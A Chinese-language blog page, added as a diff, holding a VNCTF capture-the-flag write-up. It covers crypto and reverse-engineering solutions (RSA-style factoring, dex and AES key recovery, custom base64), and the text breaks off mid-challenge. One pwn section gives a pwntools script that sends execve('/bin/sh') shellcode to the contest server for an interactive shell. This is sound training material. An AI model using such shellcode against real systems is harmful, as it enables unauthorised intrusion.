@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Britney的小屋 | Britney的小屋</title><meta name="author" content="Britney"><meta name="copyright" content="Britney"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="VNCTF WPeasymath​Ai大法(doge) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from sympy import symbols, solve# 定义变量x &#x3D; symbols(&#x27;x&#x27;)# 多项式系数coeff_2 &#x3D; 15">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Britney的小屋">
+<meta property="og:url" content="https://1ncharles.github.io/2025/02/10/VNCTF%20WP/index.html">
+<meta property="og:site_name" content="Britney的小屋">
+<meta property="og:description" content="VNCTF WPeasymath​Ai大法(doge) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from sympy import symbols, solve# 定义变量x &#x3D; symbols(&#x27;x&#x27;)# 多项式系数coeff_2 &#x3D; 15">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://1ncharles.github.io/img/head.jpg">
+<meta property="article:published_time" content="2025-02-10T03:37:37.497Z">
+<meta property="article:modified_time" content="2025-02-09T19:37:26.000Z">
+<meta property="article:author" content="Britney">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://1ncharles.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://1ncharles.github.io/2025/02/10/VNCTF%20WP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Britney的小屋',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/css/readPercent.css?1"><link rel="stylesheet" href="/css/custom.css?1" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bg.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Britney的小屋</span></a><a class="nav-page-title" href="/"><span class="site-name">Britney的小屋</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-10T03:37:37.497Z" title="发表于 2025-02-10 11:37:37">2025-02-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-09T19:37:26.000Z" title="更新于 2025-02-10 03:37:26">2025-02-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="VNCTF-WP"><a href="#VNCTF-WP" class="headerlink" title="VNCTF WP"></a>VNCTF WP</h1><h1 id="easymath​"><a href="#easymath​" class="headerlink" title="easymath​"></a><code>easymath</code>​</h1><p>Ai大法(doge)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from sympy <span class="keyword">import</span> symbols, solve</span><br><span class="line"></span><br><span class="line"># 定义变量</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># 多项式系数</span><br><span class="line">coeff_2 = <span class="number">15264966144147258587171776703005926730518438603688487721465</span></span><br><span class="line">coeff_1 = <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span></span><br><span class="line">N = <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line"># 定义多项式</span><br><span class="line">polynomial = x**<span class="number">3</span> - coeff_2*x**<span class="number">2</span> + coeff_1*x - N</span><br><span class="line"></span><br><span class="line"># 求解多项式的整数根</span><br><span class="line">roots = solve(polynomial, x)</span><br><span class="line">print(<span class="string">&quot;N的素因子 n0, n1, n2:&quot;</span>, roots)</span><br><span class="line">print(roots[<span class="number">0</span>]*roots[<span class="number">1</span>]*roots[<span class="number">2</span>]==<span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span>)</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">from sympy.ntheory.modular <span class="keyword">import</span> solve_congruence</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"># 已知密文 <span class="type">c</span></span><br><span class="line"><span class="variable">c</span> <span class="operator">=</span> <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line"># N 的三个素因子</span><br><span class="line">n0 = <span class="number">3868765709106144154703556118635822400623994075212553582411</span></span><br><span class="line">n1 = <span class="number">5487564316951417093934647798659941512646442958127439071827</span></span><br><span class="line">n2 = <span class="number">5908636118089697338533572785710162817248001570348495067227</span></span><br><span class="line"></span><br><span class="line"># 计算平方根 (适用于 p ≡ <span class="number">3</span> mod <span class="number">4</span>)</span><br><span class="line">def <span class="title function_">sqrt_mod</span><span class="params">(c, p)</span>:</span><br><span class="line">    r = pow(c, (p + <span class="number">1</span>) <span class="comment">// 4, p)</span></span><br><span class="line">    <span class="keyword">return</span> (r, p - r)  # 返回两个解</span><br><span class="line"></span><br><span class="line"># 计算所有可能的 flag mod <span class="type">ni</span></span><br><span class="line"><span class="variable">roots_n0</span> <span class="operator">=</span> sqrt_mod(c, n0)</span><br><span class="line">roots_n1 = sqrt_mod(c, n1)</span><br><span class="line">roots_n2 = sqrt_mod(c, n2)</span><br><span class="line"></span><br><span class="line"># 遍历所有可能的组合</span><br><span class="line"><span class="keyword">for</span> r0, r1, r2 in itertools.product(roots_n0, roots_n1, roots_n2):</span><br><span class="line">    flag, _ = solve_congruence((r0, n0), (r1, n1), (r2, n2))</span><br><span class="line">    flag_bytes = long_to_bytes(flag)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> b<span class="string">&#x27;&#123;&#x27;</span> in flag_bytes.lower():  # 判断是否包含 <span class="string">&#x27;flag&#x27;</span> 关键字</span><br><span class="line">        print(<span class="string">&quot;找到正确 flag:&quot;</span>, flag_bytes.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h1><p>​<img src="/assets/image-20250209112206-xnz57re.png" alt="image">​</p>
+<h1 id="签个到吧​"><a href="#签个到吧​" class="headerlink" title="签个到吧​"></a><code>签个到吧</code>​</h1><p>​<img src="/assets/image-20250209112311-ga12q4n.png" alt="image">​</p>
+<p>buf可执行，直接发送shellcode即可</p>
+<p>​<img src="/assets/image-20250209112438-r7cwnxs.png" alt="image">​</p>
+<p>执行前除了rdi全被置为0，恰好便于构造shellcode</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = remote(<span class="string">&quot;node.vnteam.cn&quot;</span>,<span class="number">44184</span>) </span><br><span class="line"> </span><br><span class="line">shellcode = <span class="string">&quot;\x48\x83\xc7\x0e\xb0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span></span><br><span class="line"></span><br><span class="line">print(len(shellcode))</span><br><span class="line">payload = shellcode</span><br><span class="line"> </span><br><span class="line">r.sendlineafter(b<span class="string">&quot;strength &quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h1><p>​<img src="/assets/image-20250209113002-2qrx8co.png" alt="image">​</p>
+<p>明显的动态加载dex</p>
+<p>dex很贴心，解密算法也给了</p>
+<p>​<img src="/assets/image-20250209113115-o0wmk7f.png" alt="image">​</p>
+<p>直接执行下decode，得到第一次加密后的密文</p>
+<p>​<img src="/assets/image-20250209113635-b277hvq.png" alt="image">​</p>
+<p>第一层加密比较简单，一个交换，两个单字节加密</p>
+<p>​<img src="/assets/image-20250209113658-ejtcpc3.png" alt="image">​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">decrypt</span><span class="params">(encrypted_str)</span>:</span><br><span class="line">    recovered_chars = []</span><br><span class="line">    <span class="keyword">for</span> i, ch in <span class="title function_">enumerate</span><span class="params">(encrypted_str)</span>:</span><br><span class="line">        E = ord(ch)</span><br><span class="line">        <span class="keyword">if</span> E &lt; <span class="number">103</span>:</span><br><span class="line">            orig = E - (i % <span class="number">4</span>) + ord(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            orig = E - ord(<span class="string">&#x27;7&#x27;</span>) - (i % <span class="number">10</span>)</span><br><span class="line">        recovered_chars.append(chr(orig))</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">code</span><span class="params">(a, index)</span>:</span><br><span class="line">        <span class="keyword">if</span> index &gt;= len(a) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        a[index], a[index+<span class="number">1</span>] = a[index+<span class="number">1</span>], a[index]</span><br><span class="line">        code(a, index + <span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line">    char_list = list(<span class="string">&quot;&quot;</span>.join(recovered_chars))</span><br><span class="line">    code(char_list, <span class="number">0</span>)</span><br><span class="line">    hex_str = <span class="string">&quot;&quot;</span>.join(char_list)</span><br><span class="line">  </span><br><span class="line">    enc = bytes.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line">    origin = bytes((b - <span class="number">68</span>) % <span class="number">256</span> <span class="keyword">for</span> b in enc)</span><br><span class="line">  </span><br><span class="line">    originstr = origin.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">originstr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">encrypted</span> <span class="operator">=</span> <span class="string">&quot;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&quot;</span></span><br><span class="line">decrypted = decrypt(encrypted)</span><br><span class="line">print(decrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解密得到flag</p>
+<p>​<img src="/assets/image-20250209114024-zd7v9ar.png" alt="image">​</p>
+<h1 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a>Fuko’s starfish</h1><p>​<img src="/assets/image-20250209114206-kdd93ig.png" alt="image">​</p>
+<p>exe加载了dll，分析了下加密在dll中</p>
+<p>​<img src="/assets/image-20250209114327-ebi70xl.png" alt="image">​</p>
+<p>发现aes特征，进而发现aes的加密函数</p>
+<p>​<img src="/assets/image-20250209114422-x7y7t04.png" alt="image">​</p>
+<p>依托，不过还是可以看出aes扩展密钥的第一步，发现key来自</p>
+<p>​<img src="/assets/image-20250209114510-gxyaquu.png" alt="image">​</p>
+<p>有几个已经初始化，有的没有，看看引用</p>
+<p>​<img src="/assets/image-20250209114607-d5ts8gd.png" alt="image">​</p>
+<p>在这里发现初始化把所有的key都换掉了</p>
+<p>简单写个脚本</p>
+<p>​<img src="/assets/image-20250209114739-zh1uabu.png" alt="image">​</p>
+<p>返回加密函数，发现反调试</p>
+<p>​<img src="/assets/image-20250209114826-x7eyii8.png" alt="image">​</p>
+<p>如果被调试则不进行异或，上面的key经过异或得到真正的key</p>
+<p>​<img src="/assets/image-20250209114959-t7x9rsn.png" alt="image">​</p>
+<p>找到密文进行解密</p>
+<p>​<img src="/assets/image-20250209115023-7hn6mj5.png" alt="image">​</p>
+<p>得到flag</p>
+<h1 id="kotlindroid​"><a href="#kotlindroid​" class="headerlink" title="kotlindroid​"></a><code>kotlindroid</code>​</h1><p>分析代码，发现主加密逻辑，使用aes-gcm-nopadding加密</p>
+<p>​<img src="/assets/image-20250209115612-dh6f3mr.png" alt="image">​</p>
+<p>用了库函数？直接梭</p>
+<p>​<img src="/assets/IMG_20250209_115803-20250209115908-s9j9f87.jpg" alt="IMG_20250209_115803">​</p>
+<p>​<img src="/assets/Screenshot_2025-02-09-11-58-19-34_d3657bd9802e850-20250209115914-lfuvmpg.jpg" alt="Screenshot_2025-02-09-11-58-19-34_d3657bd9802e850">​</p>
+<p>根据题目提示，发现密文的前6字节是iv，接着的16字节是tag</p>
+<p>找个脚本解密得到flag</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">def <span class="title function_">decrypt</span><span class="params">(ciphertext_base64, key, aad)</span>:</span><br><span class="line">    # 解码 Base64 编码的密文</span><br><span class="line">    ciphertext = base64.b64decode(ciphertext_base64)</span><br><span class="line">    # 假设 IV 长度为 <span class="number">12</span> 字节，GCM 标签长度为 <span class="number">16</span> 字节</span><br><span class="line">    iv = ciphertext[:<span class="number">6</span>]</span><br><span class="line">    tag = ciphertext[-<span class="number">16</span>:]</span><br><span class="line">    encrypted_data = ciphertext[<span class="number">6</span>:-<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    # 创建 AES/GCM 解密器</span><br><span class="line">    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    # 设置额外认证数据</span><br><span class="line">    cipher.update(aad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        # 解密数据并验证标签</span><br><span class="line">        decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)</span><br><span class="line">        <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    except ValueError:</span><br><span class="line">        print(<span class="string">&quot;认证标签验证失败，数据可能被篡改。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    # 密钥，长度必须为 <span class="number">16</span>、<span class="number">24</span> 或 <span class="number">32</span> 字节（对应 AES-<span class="number">128</span>、AES-<span class="number">192</span> 或 AES-<span class="number">256</span>）</span><br><span class="line">    key = b<span class="string">&#x27;atrikeyssyekirta&#x27;</span></span><br><span class="line">    # 假设这是 Base64 编码的加密数据</span><br><span class="line">    ciphertext_base64 = <span class="string">&#x27;MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==&#x27;</span></span><br><span class="line">    # 额外认证数据</span><br><span class="line">    aad = b<span class="string">&#x27;mysecretadd&#x27;</span></span><br><span class="line"></span><br><span class="line">    decrypted_text = decrypt(ciphertext_base64, key, aad)</span><br><span class="line">    <span class="keyword">if</span> decrypted_text:</span><br><span class="line">        print(<span class="string">&quot;解密结果:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20250209121555-91wp5fg.png" alt="image">​</p>
+<h1 id="AndroidLux"><a href="#AndroidLux" class="headerlink" title="AndroidLux"></a>AndroidLux</h1><p>java层没有东西，只有初始化busybox和启动env</p>
+<p>​<img src="/assets/image-20250209123302-tod6788.png" alt="image">​</p>
+<p>assets目录下的env解压得到env文件</p>
+<p>​<img src="/assets/image-20250209123515-c9g99lb.png" alt="image">​</p>
+<p>似乎是一个简单的base64编码</p>
+<p>base64是变种</p>
+<p>​<img src="/assets/image-20250209125440-x6190jo.png" alt="image">​</p>
+<p>位移变了，码表也变了，解密算法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">decode_custom_base64</span><span class="params">(encoded)</span>:</span><br><span class="line">    base64_chars = <span class="string">&quot;TUVWXYZabcdefghijABCDEF456789GHIJKLMNOPQRSklmnopqrstuvwxyz0123+/&quot;</span></span><br><span class="line">    base64_table = &#123;<span class="type">char</span>: idx <span class="keyword">for</span> idx, <span class="type">char</span> in <span class="title function_">enumerate</span><span class="params">(base64_chars)</span>&#125;</span><br><span class="line">  </span><br><span class="line">    # 计算填充数量并去除填充符</span><br><span class="line">    pad_count = encoded.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    encoded_clean = encoded.rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    # 计算原始数据长度</span><br><span class="line">    n = len(encoded_clean)</span><br><span class="line">    <span class="keyword">if</span> pad_count == <span class="number">0</span>:</span><br><span class="line">        original_len = (n * <span class="number">3</span>) <span class="comment">// 4</span></span><br><span class="line">    elif pad_count == <span class="number">1</span>:</span><br><span class="line">        original_len = (n * <span class="number">3</span> + <span class="number">2</span>) <span class="comment">// 4</span></span><br><span class="line">    elif pad_count == <span class="number">2</span>:</span><br><span class="line">        original_len = (n * <span class="number">3</span> + <span class="number">1</span>) <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        original_len = (n * <span class="number">3</span>) <span class="comment">// 4</span></span><br><span class="line">  </span><br><span class="line">    # 转换为索引列表</span><br><span class="line">    indices = []</span><br><span class="line">    <span class="keyword">for</span> c in encoded_clean:</span><br><span class="line">        <span class="keyword">if</span> c in base64_table:</span><br><span class="line">            indices.append(base64_table[c])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            indices.append(<span class="number">0</span>)  # 处理无效字符，假设为<span class="number">0</span></span><br><span class="line">  </span><br><span class="line">    decoded = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(indices)</span>, <span class="number">4</span>):</span><br><span class="line">        chunk = indices[i:i+<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="title function_">len</span><span class="params">(chunk)</span> &lt; <span class="number">4</span>:</span><br><span class="line">            chunk.append(<span class="number">0</span>)  # 不足四部分补<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        c1, c2, c3, c4 = chunk</span><br><span class="line">    </span><br><span class="line">        # 解码第一个字节</span><br><span class="line">        a = (c1 &lt;&lt; <span class="number">2</span>) | (c2 &amp; <span class="number">0x03</span>)</span><br><span class="line">        decoded.append(a)</span><br><span class="line">    </span><br><span class="line">        # 解码第二个字节</span><br><span class="line">        b_high = (c2 &amp; <span class="number">0x3C</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        b_low = c3 &amp; <span class="number">0x0F</span></span><br><span class="line">        b = (b_high &lt;&lt; <span class="number">4</span>) | b_low</span><br><span class="line">        decoded.append(b)</span><br><span class="line">    </span><br><span class="line">        # 解码第三个字节</span><br><span class="line">        c_high = (c3 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span></span><br><span class="line">        c = (c_high &lt;&lt; <span class="number">6</span>) | c4</span><br><span class="line">        decoded.append(c)</span><br><span class="line">  </span><br><span class="line">    # 根据原始长度截断结果</span><br><span class="line">    <span class="keyword">return</span> bytes(decoded[:original_len])</span><br><span class="line"></span><br><span class="line"># 示例用法</span><br><span class="line">encoded_str = <span class="string">&quot;56BM&quot;</span>  # 编码后的字符串</span><br><span class="line">decoded_data = decode_custom_base64(encoded_str)</span><br><span class="line">print(decoded_data) </span><br></pre></td></tr></table></figure>
+
+<p>解密密文发现解不出来，在这里卡了好久，最后也没找到对密文和输入修改的地方</p>
+<p>所以我把env patch掉</p>
+<p>​<img src="/assets/image-20250209130032-nlc89we.png" alt="image">​</p>
+<p>将返回值修改为输入或者输出</p>
+<p>然后把env替换掉，输入数据</p>
+<p>​<img src="/assets/IMG_20250209_123147-20250209130127-a0g8kdo.jpg" alt="IMG_20250209_123147">​</p>
+<p>​<img src="/assets/IMG_20250209_123156-20250209130127-7jmp0xh.jpg" alt="IMG_20250209_123156">​</p>
+<p>得到上述数据，很有规律</p>
+<p>输入循环加减1，应该是跟1异或</p>
+<p>根据输出，可以发现正确的密文开始应该是ECIVEA40，而程序中的是RPVIRN40</p>
+<p>数字没发生变化，注意到I和V是相对的，然后发现对应的字母相差0xd</p>
+<p>​<img src="/assets/image-20250209130534-lmbzabo.png" alt="image">​</p>
+<p>整理下，发现对应关系是这样的</p>
+<p>​<img src="/assets/image-20250209130635-neqsilg.png" alt="image">​</p>
+<p>哦，rot13？</p>
+<p>尝试解密密文</p>
